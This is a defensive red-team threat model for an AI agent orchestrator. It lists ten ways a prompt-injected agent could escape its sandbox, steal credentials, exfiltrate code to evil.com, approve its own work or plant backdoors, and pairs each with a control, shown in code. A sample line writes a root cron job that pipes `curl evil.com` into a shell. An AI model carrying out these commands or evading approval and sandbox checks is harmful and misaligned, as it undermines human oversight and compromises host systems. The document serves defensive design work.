# Red Team 4 — "Security Attacker" (Adversarial Agent Penetration)

## 1. Executive Summary

This red-team evaluation adopts an adversarial mindset assuming that **the agent's reasoning engine has been completely compromised via indirect prompt injection or a malicious tool**.

We attempt 10 concrete attack vectors against the orchestrator and determine the mandatory defense-in-depth controls required to preserve system integrity.

---

## 2. Ten Adversarial Penetration Scenarios

```
+-----------------------------------------------------------------------------------+
|                        ADVERSARIAL ATTACK & DEFENSE MATRIX                        |
+-----------------------------------------------------------------------------------+
| #  | ATTACK SCENARIO                | ATTACK TECHNIQUE             | DEFENSE ENFORCEMENT          |
+----+--------------------------------+------------------------------+------------------------------+
| 1  | Forge Completion               | Compromised agent calls API  | DB verifies fencing token    |
|    | without doing work             | claiming "SUCCEEDED".        | AND passes through external  |
|    |                                |                              | Verification Gate.           |
|                                                                                   |
| 2  | Escape Sandbox                 | Agent runs kernel exploit or | Non-root UID, seccomp,       |
|    | to host filesystem             | mounts host `/` via bwrap.   | dropped capabilities, gVisor |
|    |                                |                              | user-space kernel in cloud.  |
|                                                                                   |
| 3  | Steal Cloud Credentials        | Agent scans environment and  | Zero secrets in sandbox;     |
|    | (`~/.aws`, `.env`, keys)       | `/proc` for tokens.          | Credential Broker proxy      |
|    |                                |                              | attaches auth outbound.      |
|                                                                                   |
| 4  | Cross-Workspace Poisoning      | Agent writes into another    | Unique, isolated ephemeral   |
|    |                                | execution's folder.          | directory per execution.     |
|                                                                                   |
| 5  | Exfiltrate Code via Network    | Prompt injection forces      | Egress firewall; network     |
|    |                                | `curl evil.com?code=...`     | disabled or domain allowlist.|
|                                                                                   |
| 6  | Replay Attack on Completion    | Agent replays valid signed   | Unique nonce and idempotent  |
|    |                                | completion packet.           | execution ID rejected on CAS.|
|                                                                                   |
| 7  | Bypass Human Approval          | Agent self-transitions to    | State machine strictly       |
|    |                                | `APPROVED` via API.          | requires human auth token.   |
|                                                                                   |
| 8  | Exploit Stale Lease            | Agent resumes after sleep;   | Storage rejects write via    |
|    |                                | overwrites replacement work. | monotonic fencing watermark. |
|                                                                                   |
| 9  | Artifact Poisoning (Trojan)    | Agent injects backdoor into  | Content hashing (SHA-256) +  |
|    | output binary or git diff.     | deterministic CI test suite. |
|                                                                                   |
| 10 | Malicious MCP Tool Rug-Pull    | Tool definition changes or   | Tool pinning by hash; schema |
|    | requests dangerous params.     | validation on invocation.    |
+-----------------------------------------------------------------------------------+
```

---

## 3. Deep Dive: The Self-Approval Bypass Vulnerability

### The Attack:
In many naive agent frameworks, an agent calls `mark_complete()` or issues a webhook `POST /api/work/{id}/approve`. If the orchestrator accepts this call from the agent's sandbox, an injected agent can trivially approve its own malicious code.

### The Defense:
**Rigid Actor Role Enforcement in the State Machine:**
The state transition `AWAITING_APPROVAL -> APPROVED` has a strict authorization guard:
```python
def validate_transition(work: Work, to_state: WorkStatus, actor: ActorContext):
    if to_state == WorkStatus.APPROVED:
        if actor.role != ActorRole.HUMAN_OPERATOR and actor.role != ActorRole.AUTHORIZED_POLICY_ENGINE:
            raise UnauthorizedTransitionError(
                f"Actor of role '{actor.role}' cannot trigger transition to APPROVED. "
                "Only HUMAN_OPERATOR or AUTHORIZED_POLICY_ENGINE is permitted."
            )
```
Because the agent runs with `actor.role = ActorRole.AGENT_WORKER`, any attempt to approve its own work is rejected with an HTTP 403 Forbidden error.

---

## 4. Deep Dive: Workspace Path Traversal

### The Attack:
An agent attempts to write outside its designated workspace:
```python
open("../../../../etc/cron.d/backdoor", "w").write("* * * * * root curl evil.com | sh\n")
```

### The Defense:
1. **OS-Level Jail:** The agent runs inside a mount namespace (Linux bubblewrap or container) where the host filesystem `/` is mounted strictly read-only, and only `/workspace` is writable.
2. **Path Sanitization in Tool Gateway:** The tool gateway validates all relative paths:
   ```python
   def resolve_safe_path(base_dir: Path, requested_path: str) -> Path:
       resolved = (base_dir / requested_path).resolve()
       if not resolved.is_relative_to(base_dir):
           raise PathTraversalError(f"Access denied: {requested_path} escapes workspace {base_dir}")
       return resolved
   ```

---

## 5. Architectural Mandate
Security is not an add-on. Every boundary between the agent sandbox, the tool gateway, and the control plane must be treated as a zero-trust network boundary.
